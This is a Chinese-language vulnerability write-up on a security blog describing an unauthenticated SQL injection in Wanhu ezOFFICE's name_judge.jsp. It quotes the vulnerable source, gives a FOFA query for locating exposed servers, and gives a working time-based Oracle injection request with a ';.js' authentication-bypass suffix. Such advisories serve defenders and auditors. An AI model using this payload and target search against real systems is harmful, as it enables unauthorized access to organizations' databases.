---
title: "万户OA name_judge.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-name_judge-sqli.html
asset_dir: assets/万户oa-name_judge.jsp-sql注入漏洞
---

# 万户OA name\_judge.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/30 07:39
- 900浏览
- [0评论](#comment)
- 18分钟阅读

深入探索

身份验证

认证

SQL

---

# 漏洞简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice) 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公[软件](#)产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。万户 ezOFFICE name\_judge.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql注入)漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/漏洞)获取数据库权限，深入利用可获取服务器权限。

SQL注入检测工具

# 影响版本

> 老旧版本

# fofa语法

> app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

# 漏洞分析

直接看name\_judge.jsp文件里的业务实现逻辑吧，非常简单明了

```
String govFormName=request.getParameter("govFormName")==null?"":request.getParameter("govFormName").toString();
String formId=request.getParameter("formId")==null?"":request.getParameter("formId").toString();
String formType=request.getParameter("formType")==null?"":request.getParameter("formType").toString();

try{
        conn = dsb.getDataSource().getConnection();
        stmt = conn.createStatement();
        //String strsql="select WF_IMMOFORM_ID  from wf_immobilityform where immoForm_displayName= '"+govFormName+"' ";

        String strsql="select id  from GOV_CUSTOM_DOCUMNET where govFormType="+formType+" and govFormName= '"+govFormName+"' ";

        if(formId!=null&&!formId.equals("")){    
          //strsql+="  and  WF_IMMOFORM_ID<>"+formId;
           strsql+="  and  govFormId<>"+formId;
        }

        java.sql.ResultSet rs = stmt.executeQuery(strsql);

        if(rs.next()){
            out.print("0");

        }else{
            out.print("1");

        }
```

三个参数`govFormName`、`formId`和`formType`都是直接拼接进SQL语句中然后用`executeQuery`执行，所有参数都**没有过滤或校验**，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

权限绕过分析参考：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)

漏洞扫描服务

```
POST /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js HTTP/1.1
Host: ezoffice.mrxn.net
Content-Type: application/x-www-form-urlencoded

formType=1+AND+1337=DBMS_PIPE.RECEIVE_MESSAGE('any',4)--&govFormName=1&formId=1
```

深入探索

代码安全审计

VPN服务

JSON处理工具

成功延时4秒

[![万户OA name_judge.jsp SQL注入漏洞](images/img-001-0bc0fa43c20b.webp)](https://image.mrxn.net/d143ab9044034eac9268e6c50eff19a1.webp)

其他万户OA 相关[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

广告与营销

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
